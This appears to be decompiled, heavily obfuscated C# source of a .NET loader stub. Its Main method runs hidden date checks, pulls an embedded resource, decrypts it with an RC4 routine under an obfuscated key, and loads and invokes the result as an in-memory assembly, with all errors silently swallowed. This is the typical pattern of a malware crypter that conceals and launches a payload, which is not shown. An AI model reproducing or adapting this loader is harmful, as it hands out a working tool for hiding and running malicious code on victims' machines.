using System;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;

namespace ns0;

internal sealed class Class2
{
	private static void Main(string[] args)
	{
		//IL_0196: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		Class7.smethod_2();
		if (Class5.smethod_3(BabelAttribute.Class0.Class1.smethod_1('Ǚ', 400), new DateTime(635306814331010353L), 124, '\u0005'))
		{
			throw new Exception();
		}
		if (Class5.smethod_3(BabelAttribute.Class0.Class1.smethod_1('Ǝ', 455), new DateTime(635306814207608691L), 801, '\u0358'))
		{
			throw new Exception();
		}
		if (Class5.smethod_3(BabelAttribute.Class0.Class1.smethod_1('ª', 227), new DateTime(635306814127425634L), 630, 'ȏ'))
		{
			throw new Exception();
		}
		object[] parameters = new object[0];
		Class5.smethod_5(new Random(), 300, 750, '\u0010', '\u0002');
		long num = BabelAttribute.smethod_3(459, 460);
		_ = BabelAttribute.smethod_3(584, 591) - num;
		try
		{
			ResourceManager gparam_ = new ResourceManager(Class3.smethod_0(Class5.smethod_0(Class7.smethod_0("\uf603\uf614\uf602", 58400), 58959), 62677), Class5.smethod_2(516, 566));
			byte[] byte_ = smethod_0((byte[])Class5.smethod_6(gparam_, Class3.smethod_0(Class5.smethod_0(Class7.smethod_0("捻離捻李臨立流痢泥率裡臨臨殮六溜嶺履簾", 62908), 58560), 59642), 'Ș', 564), Class3.smethod_0(Class5.smethod_0(Class7.smethod_0("\uf73b\uf778\uf77a\uf736\uf723\uf725\uf703\uf71e\uf77e\uf725\uf72d\uf70d\uf722\uf715\uf716\uf714\uf703\uf704\uf71d\uf71d\uf707\uf70d\uf702\uf723\uf71c\uf70b\uf775\uf716\uf718\uf77a\uf700\uf778\uf72d\uf700\uf735\uf700\uf739\uf728\uf71d\uf72d\uf77c\uf707\uf721\uf722\uf716\uf71b\uf721\uf706\uf71f\uf775\uf779\uf714\uf703\uf70e\uf724\uf779", 63297), 57610), 57650));
			Class9.Class10.smethod_6(gparam_, '\u0309', 828);
			Assembly gparam_2 = (Assembly)(_Assembly)Class14.Class15.smethod_2(byte_, '\u0315', '\u033b');
			if (Class9.Class10.smethod_8((MethodBase)Class9.Class10.smethod_7(gparam_2, 460, 426), 'ʼ', 737).Length > 0)
			{
				parameters = new object[1] { args };
			}
			Class9.Class10.smethod_7(gparam_2, 736, 646).Invoke(null, parameters);
		}
		catch
		{
		}
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] array = BabelAttribute.Class0.Class1.smethod_3(Class7.smethod_4('ɐ', 619), string_0, 552, 583);
		byte[] array2 = new byte[256];
		byte[] array3 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array2[i] = (byte)i;
			array3[i] = array[i % Class5.smethod_7((Array)array, 0, 621, (short)550)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array2[i] + array3[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
		}
		num = 0;
		i = 0;
		for (int j = 0; j < Class9.Class10.Class11.smethod_0((Array)byte_0, 0, (short)88, (short)20); j++)
		{
			i = (i + 1) % 256;
			num = (num + array2[i]) % 256;
			byte b = array2[i];
			array2[i] = array2[num];
			array2[num] = b;
			int num2 = (array2[i] + array2[num]) % 256;
			byte_0[j] ^= array2[num2];
		}
		return byte_0;
	}
}
